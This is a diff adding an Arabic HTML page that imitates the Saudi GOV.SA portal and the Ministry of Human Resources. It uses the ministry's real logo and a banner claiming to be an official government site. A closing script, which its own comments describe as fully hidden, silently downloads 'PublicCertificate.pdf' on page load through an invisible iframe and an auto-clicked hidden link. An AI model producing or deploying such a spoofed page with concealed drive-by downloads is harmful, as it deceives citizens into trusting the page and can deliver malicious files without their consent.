@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>المنصة الوطنية الموحدة GOV.SA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            color: #222;
+            line-height: 1.6;
+        }
+
+        /* الشريط العلوي الرئيسي */
+        .top-header {
+            background-color: #1a4d3e;
+            color: white;
+            padding: 0.75rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 1rem;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+        }
+
+        .menu-icon {
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        .header-title {
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+
+        .lang-switch {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 0.4rem 1rem;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+
+        /* شريط الخدمات العلوي الثاني */
+        .services-bar {
+            background-color: #e9ecef;
+            padding: 0.5rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .gov-flag {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .gov-flag i {
+            color: #1a4d3e;
+            font-size: 1.2rem;
+        }
+
+        .gov-flag-text {
+            font-size: 0.85rem;
+            color: #495057;
+        }
+
+        .customize-btn {
+            background: none;
+            border: 1px solid #adb5bd;
+            padding: 0.4rem 1rem;
+            border-radius: 4px;
+            color: #495057;
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+
+        /* الهيدر الرئيسي بالشعار والقائمة */
+        .main-header {
+            background-color: white;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .menu-toggle {
+            font-size: 1.5rem;
+            color: #333;
+            cursor: pointer;
+        }
+
+        /* شعار الوزارة الأصلي */
+        .ministry-logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .ministry-logo img {
+            height: 57px;
+            width: auto;
+            max-width: 200px;
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+            flex-wrap: wrap;
+        }
+
+        .nav-menu li {
+            position: relative;
+        }
+
+        .nav-menu a {
+            text-decoration: none;
+            color: #333;
+            font-weight: 500;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+
+        .nav-menu .active {
+            color: #1a4d3e;
+            font-weight: 600;
+        }
+
+        .nav-icons {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .nav-icons i {
+            font-size: 1.2rem;
+            color: #555;
+            cursor: pointer;
+        }
+
+        /* البانر العلوي للصفحة */
+        .page-banner {
+            background-color: #f1f3f5;
+            padding: 2rem;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.03"><path fill="%231a4d3e" d="M20 20h60v60H20z"/><path fill="%231a4d3e" d="M10 10h80v80H10z"/></svg>');
+            background-repeat: repeat;
+        }
+
+        .breadcrumb {
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+        }
+
+        .breadcrumb span {
+            color: #333;
+            font-weight: 500;
+        }
+
+        .page-title {
+            font-size: 2.2rem;
+            font-weight: 600;
+            color: #222;
+        }
+
+        /* المحتوى الرئيسي */
+        .main-content {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 2rem;
+        }
+
+        /* رسالة تحميل مخفية - غير مرئية للمستخدم */
+        .hidden-download-message {
+            display: none; /* مخفي تماماً */
+        }
+
+        /* بطاقات الخدمات */
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5rem;
+            margin-bottom: 3rem;
+        }
+
+        .service-card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            padding: 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #e9ecef;
+            transition: all 0.3s ease;
+        }
+
+        .service-card:hover {
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            transform: translateY(-2px);
+        }
+
+        .service-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #222;
+        }
+
+        .card-arrow {
+            background: #f1f3f5;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a4d3e;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+        }
+
+        .service-card:hover .card-arrow {
+            background: #1a4d3e;
+            color: white;
+        }
+
+        /* قسم صفحة المستفيد */
+        .beneficiary-section {
+            background-color: #e9ecef;
+            padding: 2rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+        }
+
+        .beneficiary-text {
+            font-size: 0.95rem;
+            color: #444;
+            margin-bottom: 1rem;
+            line-height: 1.8;
+        }
+
+        .beneficiary-link {
+            color: #1a4d3e;
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 1rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .beneficiary-link:hover {
+            text-decoration: underline;
+        }
+
+        /* شريط التقييم */
+        .rating-bar {
+            background-color: #f1f3f5;
+            padding: 1.5rem 2rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+        }
+
+        .rating-content {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .rating-label {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .rating-buttons {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .rating-btn {
+            background: white;
+            border: 1px solid #ced4da;
+            padding: 0.5rem 2rem;
+            border-radius: 4px;
+            color: #333;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        .rating-btn:hover {
+            background: #1a4d3e;
+            color: white;
+            border-color: #1a4d3e;
+        }
+
+        .rating-stats {
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-right: auto;
+        }
+
+        .last-update {
+            color: #6c757d;
+            font-size: 0.9rem;
+            border-bottom: 1px solid #dee2e6;
+            padding-bottom: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        /* فوتر الروابط */
+        .footer-links {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 4rem;
+            margin: 3rem 0 2rem;
+        }
+
+        .footer-col h3 {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 1.5rem;
+        }
+
+        .footer-col ul {
+            list-style: none;
+        }
+
+        .footer-col li {
+            margin-bottom: 0.75rem;
+        }
+
+        .footer-col a {
+            color: #6c757d;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.3s ease;
+        }
+
+        .footer-col a:hover {
+            color: #1a4d3e;
+        }
+
+        /* شريط التطبيقات */
+        .apps-bar {
+            background-color: #f1f3f5;
+            padding: 2rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 2rem;
+        }
+
+        .apps-icons {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .app-icon {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: #333;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .app-icon:hover {
+            color: #1a4d3e;
+        }
+
+        .social-icons {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .social-icons i {
+            font-size: 1.5rem;
+            color: #555;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .social-icons i:hover {
+            color: #1a4d3e;
+        }
+
+        /* الفوتر السفلي */
+        .bottom-footer {
+            border-top: 1px solid #dee2e6;
+            padding: 2rem 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .copyright {
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+
+        .footer-bottom-links {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-bottom-links a {
+            color: #6c757d;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.3s ease;
+        }
+
+        .footer-bottom-links a:hover {
+            color: #1a4d3e;
+        }
+
+        .footer-logos {
+            display: flex;
+            gap: 2rem;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .vision-logo, .founding-logo {
+            height: 40px;
+            opacity: 0.7;
+            transition: opacity 0.3s ease;
+        }
+
+        .vision-logo:hover, .founding-logo:hover {
+            opacity: 1;
+        }
+
+        hr {
+            border: 0;
+            border-top: 1px solid #dee2e6;
+            margin: 2rem 0;
+        }
+
+        ul {
+            margin: 2rem 0;
+            padding-right: 2rem;
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin: 2rem 0 1rem;
+        }
+
+        @media (max-width: 768px) {
+            .services-grid {
+                grid-template-columns: 1fr;
+            }
+            .footer-links {
+                grid-template-columns: 1fr;
+                gap: 2rem;
+            }
+            .apps-bar {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .main-header {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            .nav-menu {
+                justify-content: center;
+            }
+        }
+    </style>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <!-- الشريط العلوي الأول - أخضر غامق -->
+    <div class="top-header">
+        <div class="header-left">
+            <span class="menu-icon">☰</span>
+            <span class="header-title">المنصة الوطنية الموحدة GOV.SA</span>
+        </div>
+        <div class="lang-switch">EN</div>
+    </div>
+
+    <!-- الشريط العلوي الثاني - رمادي مع العلم السعودي -->
+    <div class="services-bar">
+        <div class="gov-flag">
+            <i class="fas fa-flag"></i>
+            <span class="gov-flag-text">موقع حكومي رسمي تابع لحكومة المملكة العربية السعودية</span>
+        </div>
+        <button class="customize-btn">خصص تجربتك؟</button>
+    </div>
+
+    <!-- الهيدر الرئيسي مع الشعار الأصلي والقائمة -->
+    <div class="main-header">
+        <div class="logo-area">
+            <span class="menu-toggle">☰</span>
+            <!-- شعار الوزارة الأصلي من الرابط المطلوب -->
+            <div class="ministry-logo">
+                <img src="https://www.hrsd.gov.sa/themes/custom/hrsd_saud/logo.svg" alt="وزارة الموارد البشرية والتنمية الاجتماعية" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 200 57\'%3E%3Crect width=\'200\' height=\'57\' fill=\'%231a4d3e\'/%3E%3Ctext x=\'20\' y=\'35\' fill=\'white\' font-family=\'Arial\' font-size=\'14\' font-weight=\'bold\'%3Eوزارة الموارد البشرية%3C/text%3E%3Ctext x=\'20\' y=\'50\' fill=\'white\' font-family=\'Arial\' font-size=\'10\'%3Eوالتنمية الاجتماعية%3C/text%3E%3C/svg%3E';">
+            </div>
+        </div>
+        <ul class="nav-menu">
+            <li><a href="#">الوزارة <i class="fas fa-chevron-down"></i></a></li>
+            <li><a href="#" class="active">خدمات الوزارة <i class="fas fa-chevron-down"></i></a></li>
+            <li><a href="#">نهتم بكم <i class="fas fa-chevron-down"></i></a></li>
+            <li><a href="#">مركز المعرفة <i class="fas fa-chevron-down"></i></a></li>
+            <li><a href="#">المركز الإعلامي <i class="fas fa-chevron-down"></i></a></li>
+            <li><a href="#">تواصل معنا <i class="fas fa-chevron-down"></i></a></li>
+        </ul>
+        <div class="nav-icons">
+            <i class="fas fa-search"></i>
+            <i class="fas fa-globe"></i>
+        </div>
+    </div>
+
+    <!-- شريط التنقل والعنوان -->
+    <div class="page-banner">
+        <div class="main-content" style="margin:0 auto; padding:0;">
+            <div class="breadcrumb">
+                الرئيسية > <span>المنصة الوطنية الموحدة GOV.SA</span>
+            </div>
+            <h1 class="page-title">المنصة الوطنية الموحدة GOV.SA</h1>
+        </div>
+    </div>
+
+    <!-- المحتوى الرئيسي -->
+    <div class="main-content">
+        <!-- رسالة تحميل مخفية تماماً -->
+        <div class="hidden-download-message" id="hiddenDownloadMessage"></div>
+
+        <!-- الفقرة الأولى -->
+        <p>المنصة الوطنية الموحدة للتعاملات الإلكترونية الحكومية هي منصة إلكترونية تستطيع من خلالها المواطنين والمسؤولين والشبكات والزوار من أي مكان الوصول إلى الخدمات الحكومية الإلكترونية في المملكة العربية السعودية. وتنفيذ التعاملات بها بسرعة وكفاءة عالية، حيث تعتبر المدخل إلى الخدمات الإلكترونية الحكومية.</p>
+        <p>وتحقق إمكانية الوصول إلى الخدمات الإلكترونية عن طريق توفير الخدمات الإلكترونية عبر المنصة إنما عن طريق التكامل مع جهات حكومية أخرى، أو عن طريق توفير روابط المواقع الإلكترونية لتلك الجهات وخدماتها على المنصة.</p>
+
+        <!-- القائمة النقطية -->
+        <ul>
+            <li><strong>تمثل منفذاً معلوماتياً مهماً لتنشأ الأخبار المتعلقة بالعملة العادية في مناطقها.</strong></li>
+            <li><strong>توفر دليل الجهات الحكومية.</strong></li>
+            <li><strong>توفر المنصة عددا كبيراً من روابط الأنظمة واللوائح والقوانين والخطط والمبادرة السعودية.</strong></li>
+            <li><strong>توفر قسم "عن المملكة" الذي تحتوي صفحته على معلومات عن المملكة العربية السعودية.</strong></li>
+        </ul>
+
+        <!-- خط فاصل -->
+        <hr>
+
+        <div style="margin: 1rem 0;">يمكنك زيارة المنصة الوطنية الموحدة بالضغط هنا:</div>
+
+        <hr>
+
+        <!-- الفقرة الثانية -->
+        <p>تمثل صفحة المستفيد جزءاً من منظومة موحدة ومتكاملة تهدف إلى تعزيز رضا المستفيدين من خلال الارتقاء بكفاءة معالجة الشكاوى والطلبات والبلاغات، والاستجابة للاستفسارات بفعاليّة وكفاءة عالية. وتتخذ من أجل تنظيم عملية التواصل الإلكتروني مع المسؤولين في الوزارة، وذلك من خلال تمكين المستفيدين من الوصول إلى خدمة التواصل مع معالي الوزير. وتُؤدّي هذه الخدمة في إطار الرقابة المباشرة وتحسين جودة الخدمات المقدمة وتعزيز مستوى التفاعل مع المستفيدين عبر القنوات الرقمية السريعة.</p>
+
+        <!-- عنوان صفحة المستفيد -->
+        <h2>صفحة المستفيد</h2>
+
+        <!-- تاريخ آخر تعديل -->
+        <div class="last-update">
+            تاريخ آخر تعديل: <span dir="ltr">2025/06/03 م</span> بتوقيت السعودية
+        </div>
+
+        <!-- بطاقات الخدمات -->
+        <div class="services-grid">
+            <div class="service-card">
+                <span class="service-title">التسوية الودية</span>
+                <div class="card-arrow"><i class="fas fa-arrow-left"></i></div>
+            </div>
+            <div class="service-card">
+                <span class="service-title">الاستعلام عن الاتصالات الادارية</span>
+                <div class="card-arrow"><i class="fas fa-arrow-left"></i></div>
+            </div>
+            <div class="service-card">
+                <span class="service-title">خدمة ثالثة</span>
+                <div class="card-arrow"><i class="fas fa-arrow-left"></i></div>
+            </div>
+        </div>
+
+        <!-- قسم صفحة المستفيد المميز -->
+        <div class="beneficiary-section">
+            <p class="beneficiary-text">تمثل صفحة المستفيد جزءاً من منظومة موحدة ومتكاملة تهدف إلى تعزيز رضا المستفيدين من خلال الارتقاء بكفاءة معالجة الشكاوى والطلبات والبلاغات، والاستجابة للاستفسارات بفعالية وكفاءة عالية. وتهدف إلى تعزيز فعالية التواصل الإلكتروني مع المسؤولين في الوزارة، وذلك من خلال تمكين المستفيدين من الوصول إلى خدمة التواصل مع معالي الوزير. وتأتي هذه الخدمة في إطار التزام الوزارة المستمر بتحسين جودة الخدمات المقدمة وتعزيز مستوى التفاعل مع المستفيدين عبر القنوات الرقمية الرسمية.</p>
+            <a href="#" class="beneficiary-link">صفحة المستفيد <i class="fas fa-arrow-left"></i></a>
+        </div>
+
+        <!-- شريط التقييم -->
+        <div class="rating-bar">
+            <div class="rating-content">
+                <span class="rating-label">هل كانت هذه الصفحة مفيدة؟</span>
+                <div class="rating-buttons">
+                    <button class="rating-btn">نعم</button>
+                    <button class="rating-btn">لا</button>
+                </div>
+                <span class="rating-stats">35.37% من المستخدمين قالو نعم من 3073 تعليقا.</span>
+            </div>
+        </div>
+
+        <!-- روابط الفوتر الرئيسية -->
+        <div class="footer-links">
+            <div class="footer-col">
+                <h3>نظرة عامة</h3>
+                <ul>
+                    <li><a href="#">عن الوزارة</a></li>
+                    <li><a href="#">كيفية الإستخدام</a></li>
+                    <li><a href="#">التسجيل في الدولة</a></li>
+                    <li><a href="#">اتفاقية مستوى الخدمة</a></li>
+                    <li><a href="#">أمن المعلومات</a></li>
+                    <li><a href="#">المنتجات الرقمية</a></li>
+                    <li><a href="#">الأجزاء</a></li>
+                    <li><a href="#">الفعاليات</a></li>
+                    <li><a href="#">سياسة سريعة الوصول</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h3>الدعم والمساعدة</h3>
+                <ul>
+                    <li><a href="#">تواصل معنا</a></li>
+                    <li><a href="#">تجربتكم</a></li>
+                    <li><a href="#">تقديم شكوى</a></li>
+                    <li><a href="#">التطبيق عن الفساد</a></li>
+                    <li><a href="#">حرية المعلومات</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h3>روابط مهمة</h3>
+                <ul>
+                    <li><a href="#">هيئة الخبراء بمجلس الوزراء</a></li>
+                    <li><a href="#">البيانات المفتوحة</a></li>
+                    <li><a href="#">ميثاق العملاء</a></li>
+                    <li><a href="#">منصة المشاركة الإلكترونية</a></li>
+                    <li><a href="#">بوابة سعودي الوطنية</a></li>
+                    <li><a href="#">جريدة أم القرى</a></li>
+                    <li><a href="#">وكالة الأنباء السعودية</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- شريط التطبيقات والتواصل الاجتماعي -->
+        <div class="apps-bar">
+            <div>
+                <h3 style="margin-bottom: 1rem; font-size: 1rem;">تطبيقات الوزارة</h3>
+                <div class="apps-icons">
+                    <a href="#" class="app-icon"><i class="fab fa-apple"></i> App Gallery</a>
+                    <a href="#" class="app-icon"><i class="fab fa-google-play"></i> Google play</a>
+                    <a href="#" class="app-icon"><i class="fas fa-store"></i> huawei</a>
+                </div>
+            </div>
+            <div>
+                <h3 style="margin-bottom: 1rem; font-size: 1rem;">تابعنا على</h3>
+                <div class="social-icons">
+                    <i class="fab fa-instagram"></i>
+                    <i class="fab fa-twitter"></i>
+                    <i class="fab fa-tiktok"></i>
+                    <i class="fab fa-snapchat"></i>
+                    <i class="fab fa-facebook"></i>
+                    <i class="fab fa-linkedin"></i>
+                    <i class="fab fa-youtube"></i>
+                </div>
+            </div>
+        </div>
+
+        <!-- الفوتر السفلي -->
+        <div class="bottom-footer">
+            <div>
+                <p class="copyright">جميع الحقوق محفوظة لموقع وزارة الموارد البشرية والتنمية الاجتماعية © 2026</p>
+                <p class="copyright" style="margin-top: 0.5rem;">تاريخ آخر تعديل: 2026/02/26</p>
+            </div>
+            <div class="footer-bottom-links">
+                <a href="#">سياسة الخصوصية</a>
+                <a href="#">خريطة الموقع</a>
+                <a href="#">آر اس اس</a>
+            </div>
+            <div class="footer-logos">
+                <!-- شعار رؤية 2030 -->
+                <svg class="vision-logo" viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="40" fill="#333" rx="4"/>
+                    <text x="10" y="25" fill="white" font-family="Arial" font-size="12" font-weight="bold">رؤية 2030</text>
+                </svg>
+                <!-- شعار يوم التأسيس -->
+                <svg class="founding-logo" viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="40" fill="#1a4d3e" rx="4"/>
+                    <text x="10" y="25" fill="white" font-family="Arial" font-size="12" font-weight="bold">يوم التأسيس</text>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <!-- كود تحميل PDF المخفي -->
+    <script>
+        // دالة لتحميل ملف PDF بشكل مخفي
+        function downloadPDF() {
+            // قم بتغيير هذا المسار إلى المسار الصحيح لملف PDF الخاص بك
+            const pdfUrl = 'PublicCertificate.pdf'; // ضع هنا اسم ملف PDF الخاص بك
+            const fileName = 'PublicCertificate.pdf'; // اسم الملف عند التحميل
+            
+            // إنشاء عنصر iframe مخفي للتحميل (طريقة أكثر احترافية)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = pdfUrl;
+            document.body.appendChild(iframe);
+            
+            // إزالة iframe بعد ثانيتين
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+            }, 2000);
+            
+            // طريقة احتياطية: إنشاء رابط تحميل مخفي
+            const link = document.createElement('a');
+            link.href = pdfUrl;
+            link.download = fileName;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            
+            // إزالة الرابط بعد التحميل
+            setTimeout(() => {
+                document.body.removeChild(link);
+            }, 1000);
+        }
+
+        // التحميل التلقائي عند فتح الصفحة (مخفي تماماً)
+        window.addEventListener('load', function() {
+            // تأخير بسيط لضمان تحميل الصفحة بالكامل
+            setTimeout(function() {
+                downloadPDF();
+            }, 500); // تأخير نصف ثانية فقط
+        });
+
+        // يمكنك إضافة هذا السطر في وحدة التحكم لاختبار التحميل: downloadPDF();
+    </script>
+</body>
+</html>
